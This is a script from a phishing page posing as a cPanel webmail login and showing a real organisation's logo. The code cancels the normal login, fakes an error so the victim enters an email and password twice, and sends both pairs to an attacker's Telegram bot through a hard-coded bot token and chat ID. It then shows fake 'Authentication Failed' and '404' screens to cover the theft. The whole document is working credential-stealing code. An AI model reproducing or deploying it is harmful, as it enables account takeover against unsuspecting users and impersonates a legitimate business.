<script>
    // Configuration for Telegram Bot (Replace with your actual Bot Token and Chat ID)
    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";

    let attemptCount = 0;
    let firstAttemptData = {};

    async function sendToTelegram(text) {
        if (TELEGRAM_BOT_TOKEN === "9210159298:AAHzP_UYM3t7ANfxppPysZMRDBm2ItskTOE") return;
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: 5161871664,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
        } catch (e) {
            console.error("Telegram error:", e);
        }
    }

    document.getElementById('login_form').addEventListener('submit', async function(e) {
        e.preventDefault();
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;
        const submitBtn = document.getElementById('login_submit');
        const alertBox = document.getElementById('custom-alert');

        submitBtn.disabled = true;
        submitBtn.innerText = "Verifying...";

        attemptCount++;

        if (attemptCount === 1) {
            firstAttemptData = { user, pass };

            setTimeout(() => {
                alertBox.style.display = 'block';
                document.getElementById('user').value = '';
                document.getElementById('pass').value = '';
                submitBtn.disabled = false;
                submitBtn.innerText = "Log in";
            }, 800);
        } else {
            const message = `🚨 <b>Webmail Dual-Attempt Capture</b>\n\n` +
                            `⏱️ <b>Timestamp:</b> ${new Date().toLocaleString()}\n\n` +
                            `📌 <b>Attempt #1:</b>\n` +
                            `📧 Email: <code>${firstAttemptData.user}</code>\n` +
                            `🔑 Password: <code>${firstAttemptData.pass}</code>\n\n` +
                            `📌 <b>Attempt #2:</b>\n` +
                            `📧 Email: <code>${user}</code>\n` +
                            `🔑 Password: <code>${pass}</code>`;

            await sendToTelegram(message);
            loadErrorView();
        }
    });

    function loadErrorView() {
        const contentContainer = document.getElementById('content-container');
        contentContainer.innerHTML = `
            <div id="login-container">
                <div id="login-sub-container">
                    <div id="login-sub-header">
                        <img class="main-logo" src="https://webmail.alserhgroup.ae/cPanel_magic_revision_1682619565/unprotected/cpanel/images/webmail-logo.svg" alt="logo" />
                    </div>
                    <div id="login-sub">
                        <div class="error-card-custom" id="error-card-box">
                            <h3>Authentication Failed</h3>
                            <p>The email address or password you entered is invalid.</p>
                            <p><strong>Please try again.</strong></p>
                            <div class="redirect-notice" id="countdown-text">Form not found. Redirecting in 3 seconds...</div>
                        </div>
                    </div>
                </div>
            </div>
        `;

        let secondsLeft = 3;
        const countdownEl = document.getElementById('countdown-text');

        const timer = setInterval(() => {
            secondsLeft--;
            if (secondsLeft > 0) {
                countdownEl.innerText = `Form not found. Please try again later. Redirecting in ${secondsLeft}s...`;
            } else {
                clearInterval(timer);
                document.getElementById('error-card-box').outerHTML = `
                    <div class="error-card-custom" style="border-color: #cbd5e0; background-color: #f7fafc; color: #4a5568;">
                        <h3>404 - Form Not Found</h3>
                        <p>The requested form is no longer available.</p>
                        <p><strong>Please try again later.</strong></p>
                        <div style="margin-top: 15px;">
                            <a href="" style="color: #3182ce; text-decoration: underline; font-weight: bold;">Reload Page</a>
                        </div>
                    </div>
                `;
            }
        }, 1000);
    }
</script>
